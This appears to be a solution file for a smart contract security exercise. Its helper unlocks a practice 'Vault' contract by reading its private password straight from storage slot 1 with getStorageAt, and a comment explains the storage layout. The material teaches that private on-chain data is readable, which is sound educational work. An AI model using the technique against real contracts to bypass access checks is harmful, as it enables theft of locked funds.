import { expect } from "chai";
import { ethers, waffle } from "../../../node_modules/hardhat";

const helper = async (victim: any) => {
  /* 
    Add code here that will help you pass the test
    Note: Unlock without using the string "A very strong password"
    Unlock the vault by somehow reading the private password from 
    Vault directly
  */
 
  /**
  * Because it is the second declared variable, it is stored on slot 1 since each slot 
  * is 32 bytes and stored in order of declaration 
  */
  const password_slot = 1;
  const password = ethers.provider.getStorageAt(victim.address, password_slot); 
  await victim.unlock(password);
};

export default helper;
